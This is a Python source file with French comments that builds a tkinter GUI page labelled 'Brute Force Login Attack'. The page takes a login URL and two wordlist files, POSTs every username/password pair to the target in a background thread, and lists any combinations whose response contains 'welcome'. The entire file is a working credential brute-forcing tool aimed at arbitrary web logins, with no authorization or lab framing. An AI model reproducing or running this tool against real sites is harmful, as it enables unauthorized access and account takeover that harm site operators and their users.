import tkinter as tk
from tkinter import messagebox, filedialog
import requests
import threading  # Pour permettre l'arrêt propre de l'attaque

class bfPage(tk.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller
        
        # Titre de la page
        self.title_label = tk.Label(self, text="Brute Force Login Attack", font=("Arial", 16))
        self.title_label.pack(pady=20)

        # Champs pour l'URL
        self.url_label = tk.Label(self, text="URL de Login (ex: http://example.com/login):")
        self.url_label.pack(pady=5)
        self.url_entry = tk.Entry(self, width=40)
        self.url_entry.pack(pady=5)

        # Boutons pour sélectionner les fichiers (login et mdp)
        self.login_file_button = tk.Button(self, text="Sélectionner le fichier des Logins", command=self.select_login_file)
        self.login_file_button.pack(pady=5)
        self.login_file_label = tk.Label(self, text="Aucun fichier sélectionné", font=("Arial", 10), fg="gray")
        self.login_file_label.pack(pady=5)

        self.password_file_button = tk.Button(self, text="Sélectionner le fichier des Mots de Passe", command=self.select_password_file)
        self.password_file_button.pack(pady=5)
        self.password_file_label = tk.Label(self, text="Aucun fichier sélectionné", font=("Arial", 10), fg="gray")
        self.password_file_label.pack(pady=5)

        # Boutons pour démarrer et arrêter l'attaque
        self.start_button = tk.Button(self, text="Lancer l'attaque", command=self.start_attack)
        self.start_button.pack(pady=10)

        # Bouton "Stop" initialement désactivé
        self.stop_button = tk.Button(self, text="Arrêter l'attaque", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        # Label pour afficher le statut
        self.status_label = tk.Label(self, text="", font=("Arial", 12))
        self.status_label.pack(pady=10)

        # Créer un champ text pour afficher les tentatives et résultats en temps réel
        self.test_output = tk.Text(self, height=15, width=60, wrap=tk.WORD, state=tk.DISABLED)
        self.test_output.pack(pady=10)

        # Variables pour stocker les chemins des fichiers
        self.login_file_path = None
        self.password_file_path = None

        # Variables pour gérer l'état de l'attaque
        self.is_attack_running = False
        self.stop_requested = False

    def select_login_file(self):
        """Ouvrir une boîte de dialogue pour sélectionner le fichier des logins."""
        file_path = filedialog.askopenfilename(
            title="Sélectionner le fichier des Logins",
            filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")]
        )
        if file_path:
            self.login_file_path = file_path
            self.login_file_label.config(text=f"Logins : {file_path}", fg="black")
        else:
            self.login_file_label.config(text="Aucun fichier sélectionné", fg="gray")

    def select_password_file(self):
        """Ouvrir une boîte de dialogue pour sélectionner le fichier des mots de passe."""
        file_path = filedialog.askopenfilename(
            title="Sélectionner le fichier des Mots de Passe",
            filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")]
        )
        if file_path:
            self.password_file_path = file_path
            self.password_file_label.config(text=f"Mots de passe : {file_path}", fg="black")
        else:
            self.password_file_label.config(text="Aucun fichier sélectionné", fg="gray")

    def start_attack(self):
        """Démarrer l'attaque brute force."""
        url = self.url_entry.get()

        if not url or not self.login_file_path or not self.password_file_path:
            messagebox.showerror("Erreur", "Veuillez remplir l'URL et sélectionner les fichiers de logins et mots de passe.")
            return

        # Charger les logins et mots de passe à partir des fichiers
        try:
            with open(self.login_file_path, 'r') as f:
                logins = f.readlines()
            with open(self.password_file_path, 'r') as f:
                passwords = f.readlines()
        except FileNotFoundError:
            messagebox.showerror("Erreur", "Impossible de lire les fichiers sélectionnés.")
            return

        # Désactiver le bouton Start et activer le bouton Stop
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.status_label.config(text="L'attaque est en cours...")
        self.update_idletasks()

        # Liste pour stocker les combinaisons valides
        valid_combinations = []

        # Effacer le texte précédent dans le champ de test
        self.test_output.config(state=tk.NORMAL)
        self.test_output.delete(1.0, tk.END)
        self.test_output.config(state=tk.DISABLED)

        # Indiquer que l'attaque est en cours
        self.is_attack_running = True
        self.stop_requested = False

        # Lancer l'attaque dans un thread séparé
        attack_thread = threading.Thread(target=self.run_attack, args=(url, logins, passwords, valid_combinations))
        attack_thread.start()

    def run_attack(self, url, logins, passwords, valid_combinations):
        """Effectuer l'attaque brute force dans un thread séparé."""
        for login in logins:
            if self.stop_requested:
                break
            for password in passwords:
                login = login.strip()
                password = password.strip()

                # Afficher chaque tentative dans le Text widget en temps réel
                self.update_test_output(f"Tentative : {login} / {password}...\n")

                if self.try_login(url, login, password):
                    valid_combinations.append(f"{login} / {password}")
                    self.update_test_output(f"Réussi : {login} / {password}\n")

        # Afficher les résultats finaux
        self.is_attack_running = False
        if valid_combinations:
            results = "\n".join(valid_combinations)
            self.status_label.config(text=f"Logins trouvés :\n{results}")
            messagebox.showinfo("Succès", f"Logins valides trouvés :\n{results}")
        else:
            self.status_label.config(text="Aucun credentiel trouvé.")
            messagebox.showinfo("Résultat", "Aucun credentiel trouvé.")
        
        # Réactiver le bouton Start et désactiver le bouton Stop
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def update_test_output(self, text):
        """Met à jour l'affichage des tests dans le Text widget."""
        self.test_output.config(state=tk.NORMAL)
        self.test_output.insert(tk.END, text)
        self.test_output.config(state=tk.DISABLED)
        self.test_output.yview(tk.END)  # Scroll automatique

    def try_login(self, url, login, password):
        """Essayer une combinaison login et mot de passe."""
        data = {'username': login, 'password': password}  # Changez 'username' selon le formulaire
        try:
            response = requests.post(url, data=data)
            if "welcome" in response.text.lower():  # Adaptez cette condition selon la réponse du serveur
                return True
        except requests.exceptions.RequestException:
            pass
        return False

    def stop_attack(self):
        """Arrêter l'attaque brute force."""
        self.stop_requested = True
        self.status_label.config(text="L'attaque a été arrêtée.")
        messagebox.showinfo("Arrêt", "L'attaque a été arrêtée. Les résultats partiels sont affichés.")
        self.update_test_output("Attaque arrêtée.\n")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
